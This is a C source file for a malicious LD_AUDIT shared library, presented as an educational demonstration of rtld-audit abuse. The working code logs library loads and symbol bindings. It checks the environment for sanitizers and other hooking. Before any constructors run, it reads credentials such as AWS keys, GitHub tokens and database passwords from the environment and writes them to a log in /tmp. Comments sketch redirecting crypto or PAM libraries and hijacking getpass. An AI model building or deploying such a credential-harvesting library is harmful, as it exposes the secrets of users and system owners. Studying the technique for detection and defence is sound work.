/*
 * evil_audit.c - Malicious LD_AUDIT Library
 *
 * This library demonstrates offensive uses of the rtld-audit interface:
 *
 *   1. Redirect library searches to malicious libraries
 *   2. Intercept and log all symbol bindings
 *   3. Steal sensitive data (passwords, API keys)
 *   4. Execute code before ANY constructors run
 *   5. Detect security tools and sandbox environments
 *
 * The LD_AUDIT interface is MORE POWERFUL than LD_PRELOAD because:
 *   - Runs BEFORE LD_PRELOAD libraries are loaded
 *   - Can intercept library search paths
 *   - Sees all symbol resolutions
 *   - Can redirect symbols at bind time
 *
 * Usage:
 *   LD_AUDIT=./libevil_audit.so ./target_program
 *
 * EDUCATIONAL PURPOSES ONLY
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <unistd.h>
#include <link.h>
#include <dlfcn.h>
#include <pwd.h>
#include <time.h>

/* Color codes */
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[1;34m"
#define MAGENTA "\033[1;35m"
#define CYAN    "\033[1;36m"
#define RESET   "\033[0m"

#define LOG_FILE "/tmp/ld_audit_attack.log"

/* Global state */
static FILE *logfile = NULL;
static int sensitive_symbols_seen = 0;

/* ═══════════════════════════════════════════════════════════════════════════
 * LOGGING
 * ═══════════════════════════════════════════════════════════════════════════ */

static void init_log(void) {
    logfile = fopen(LOG_FILE, "a");
    if (logfile) {
        time_t now = time(NULL);
        fprintf(logfile, "\n════════════════════════════════════════════════════════\n");
        fprintf(logfile, "LD_AUDIT ATTACK LOG - %s", ctime(&now));
        fprintf(logfile, "PID: %d, UID: %d\n", getpid(), getuid());
        fprintf(logfile, "════════════════════════════════════════════════════════\n\n");
    }
}

static void log_event(const char *fmt, ...) {
    if (logfile) {
        va_list args;
        va_start(args, fmt);
        vfprintf(logfile, fmt, args);
        va_end(args);
        fflush(logfile);
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * LA_VERSION - Required entry point
 * ═══════════════════════════════════════════════════════════════════════════ */

unsigned int la_version(unsigned int version) {
    (void)version;

    init_log();

    fprintf(stderr, "\n");
    fprintf(stderr, RED "╔════════════════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, RED "║" YELLOW "          ★ MALICIOUS LD_AUDIT LIBRARY ACTIVATED ★                 " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "                                                                    " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  This runs BEFORE LD_PRELOAD, before constructors, before main()! " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  Complete visibility into all dynamic linking activity.            " RED "║\n" RESET);
    fprintf(stderr, RED "╚════════════════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");

    log_event("[+] LD_AUDIT library loaded\n");

    /* Gather initial reconnaissance */
    fprintf(stderr, CYAN "  [*] Early Reconnaissance (before anything else runs):\n" RESET);

    /* Get executable path */
    char exe[256] = {0};
    ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
    if (len > 0) {
        exe[len] = '\0';
        fprintf(stderr, "      Executable: %s\n", exe);
        log_event("[RECON] Executable: %s\n", exe);
    }

    /* Get username */
    struct passwd *pw = getpwuid(getuid());
    if (pw) {
        fprintf(stderr, "      User: %s (UID: %d)\n", pw->pw_name, getuid());
        log_event("[RECON] User: %s (UID: %d)\n", pw->pw_name, getuid());
    }

    /* Check for security tools */
    fprintf(stderr, "\n" CYAN "  [*] Security Tool Detection:\n" RESET);

    const char *security_vars[] = {
        "LD_PRELOAD",      /* Other hooking */
        "DYLD_INSERT_LIBRARIES",
        "MALLOC_CHECK_",   /* Memory debugging */
        "ASAN_OPTIONS",    /* AddressSanitizer */
        "TSAN_OPTIONS",    /* ThreadSanitizer */
        NULL
    };

    int security_detected = 0;
    for (int i = 0; security_vars[i]; i++) {
        char *val = getenv(security_vars[i]);
        if (val) {
            fprintf(stderr, RED "      [!] " RESET "%s = %s\n", security_vars[i], val);
            log_event("[SECURITY] %s detected: %s\n", security_vars[i], val);
            security_detected = 1;
        }
    }
    if (!security_detected) {
        fprintf(stderr, GREEN "      No security tools detected\n" RESET);
    }

    fprintf(stderr, "\n");

    return LAV_CURRENT;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * LA_OBJSEARCH - Library Search Path Hijacking
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * This is called for EVERY library search attempt.
 * We can redirect to our own malicious libraries!
 */

char *la_objsearch(const char *name, uintptr_t *cookie, unsigned int flag) {
    (void)cookie;
    (void)flag;

    /* Log all library searches */
    log_event("[SEARCH] %s\n", name);

    /* ATTACK: Redirect specific libraries to malicious versions
     *
     * Examples:
     *   - Redirect libcrypto.so to capture encryption keys
     *   - Redirect libpam.so to capture authentication
     *   - Redirect libssl.so to intercept TLS traffic
     */

    /*
    if (strstr(name, "libcrypto") || strstr(name, "libssl")) {
        fprintf(stderr, RED "  [REDIRECT] " RESET "Crypto library detected: %s\n", name);
        log_event("[ATTACK] Would redirect crypto library: %s\n", name);
        // return "/path/to/evil/libcrypto.so";
    }
    */

    return (char *)name;  /* No modification in demo */
}

/* ═══════════════════════════════════════════════════════════════════════════
 * LA_OBJOPEN - Library Load Monitoring
 * ═══════════════════════════════════════════════════════════════════════════ */

unsigned int la_objopen(struct link_map *map, Lmid_t lmid, uintptr_t *cookie) {
    (void)lmid;
    (void)cookie;

    const char *name = map->l_name;
    if (!name || name[0] == '\0') name = "(main executable)";

    log_event("[LOAD] %s @ 0x%lx\n", name, map->l_addr);

    /* Detect interesting libraries */
    if (strstr(name, "libcrypt") || strstr(name, "libpam") ||
        strstr(name, "libssl") || strstr(name, "libssh")) {
        fprintf(stderr, YELLOW "  [INTEREST] " RESET "Security-relevant library: %s\n", name);
        log_event("[INTEREST] Security library: %s\n", name);
    }

    return LA_FLG_BINDTO | LA_FLG_BINDFROM;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * LA_PREINIT - Execute Before All Constructors
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * This runs BEFORE:
 *   - LD_PRELOAD constructors
 *   - Library constructors
 *   - Program constructors
 *   - main()
 *
 * Perfect for establishing control before any defenses initialize!
 */

void la_preinit(uintptr_t *cookie) {
    (void)cookie;

    fprintf(stderr, YELLOW "╔════════════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, YELLOW "║  [la_preinit] Executing BEFORE all constructors!              ║\n" RESET);
    fprintf(stderr, YELLOW "╚════════════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");

    log_event("[PREINIT] Executing before constructors\n");

    /* Steal environment secrets NOW, before any sanitization */
    fprintf(stderr, CYAN "  [*] Capturing environment secrets:\n" RESET);

    const char *secrets[] = {
        "SECRET_API_KEY",
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "DATABASE_PASSWORD",
        "GITHUB_TOKEN",
        "API_KEY",
        "PASSWORD",
        "PRIVATE_KEY",
        NULL
    };

    for (int i = 0; secrets[i]; i++) {
        char *val = getenv(secrets[i]);
        if (val) {
            fprintf(stderr, RED "      [STOLEN] " RESET "%s = %s\n", secrets[i], val);
            log_event("[STOLEN] %s = %s\n", secrets[i], val);
        }
    }

    fprintf(stderr, "\n");
}

/* ═══════════════════════════════════════════════════════════════════════════
 * LA_SYMBIND64 - Symbol Binding Interception
 * ═══════════════════════════════════════════════════════════════════════════
 *
 * Called for EVERY symbol that gets resolved.
 * We can see and redirect ANY function call!
 */

uintptr_t la_symbind64(Elf64_Sym *sym, unsigned int ndx,
                       uintptr_t *refcook, uintptr_t *defcook,
                       unsigned int *flags, const char *symname) {
    (void)ndx;
    (void)refcook;
    (void)defcook;
    (void)flags;

    /* Watch for interesting symbols */
    const char *interesting[] = {
        "getenv", "getpass", "crypt", "pam_",
        "SSL_", "EVP_", "RSA_", "AES_",
        "read", "write", "send", "recv",
        "connect", "accept", "bind",
        NULL
    };

    for (int i = 0; interesting[i]; i++) {
        if (strstr(symname, interesting[i])) {
            sensitive_symbols_seen++;
            fprintf(stderr, MAGENTA "  [SYMBIND] " RESET "Sensitive: %s @ 0x%lx\n",
                    symname, (unsigned long)sym->st_value);
            log_event("[SYMBIND] %s @ 0x%lx\n", symname, (unsigned long)sym->st_value);
            break;
        }
    }

    /* ATTACK: We could redirect symbols here!
     *
     * if (strcmp(symname, "getpass") == 0) {
     *     *flags |= LA_SYMB_ALTVALUE;
     *     return (uintptr_t)evil_getpass;
     * }
     */

    return sym->st_value;
}

/* ═══════════════════════════════════════════════════════════════════════════
 * DESTRUCTOR
 * ═══════════════════════════════════════════════════════════════════════════ */

__attribute__((destructor))
static void evil_fini(void) {
    fprintf(stderr, "\n");
    fprintf(stderr, RED "╔════════════════════════════════════════════════════════════════════╗\n" RESET);
    fprintf(stderr, RED "║" YELLOW "          ★ LD_AUDIT ATTACK SESSION COMPLETE ★                     " RED "║\n" RESET);
    fprintf(stderr, RED "║" RESET "  Log: " BLUE LOG_FILE RESET "                             " RED "║\n" RESET);
    fprintf(stderr, RED "╚════════════════════════════════════════════════════════════════════╝\n" RESET);
    fprintf(stderr, "\n");
    fprintf(stderr, "  Sensitive symbols intercepted: " GREEN "%d" RESET "\n", sensitive_symbols_seen);
    fprintf(stderr, "\n");

    log_event("\n[+] Session ended. Symbols intercepted: %d\n", sensitive_symbols_seen);

    if (logfile) {
        fclose(logfile);
    }
}
